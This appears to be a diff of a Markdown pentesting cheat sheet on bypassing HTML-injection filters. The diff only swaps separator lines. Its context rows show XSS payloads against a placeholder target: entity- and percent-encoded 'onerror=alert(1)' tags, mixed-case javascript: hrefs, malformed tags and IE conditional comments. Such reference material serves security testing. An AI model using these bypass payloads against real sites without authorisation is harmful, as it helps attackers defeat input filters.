@@ -16,7 +16,7 @@ linked:
 ---
 # HTML Injection - Bypass de Filtros
 
-***
+---
 
 ## HTML Entity Encoding
 
@@ -36,7 +36,7 @@ linked:
 | `python3 -c "print(''.join(f'&#x{ord(c):x};' for c in '<img src=x onerror=alert(1)>'))"` | Generate hex entity payload | DIY hex encoder. |
 ^htmli-bypass-entity
 
-___
+---
 
 ## URL / Unicode Encoding
 
@@ -56,7 +56,7 @@ ___
 | `python3 -c "s='<img src=x>'; print(''.join('%%%02X' % ord(c) for c in s))"` | Manual percent encoding | Custom encoder. |
 ^htmli-bypass-url
 
-___
+---
 
 ## Tag/Attribute Case Manipulation
 
@@ -77,7 +77,7 @@ ___
 | `curl 'https://target/?q=<a HrEf="javascript:alert(1)">x</a>'` | Mixed case href attribute | Same case bypass. |
 ^htmli-bypass-case
 
-___
+---
 
 ## Whitespace Tricks
 
@@ -98,7 +98,7 @@ ___
 | `curl 'https://target/?q=<img src=x onerror=alert(1) /'` | Missing `>` self-close | Edge parse. |
 ^htmli-bypass-whitespace
 
-___
+---
 
 ## Comment Injection
 
@@ -118,4 +118,4 @@ ___
 | `curl 'https://target/?q=<![if IE]><script>alert(1)</script><![endif]>'` | Downlevel-revealed conditional | IE non-standard. |
 ^htmli-bypass-comment
 
-***
+---
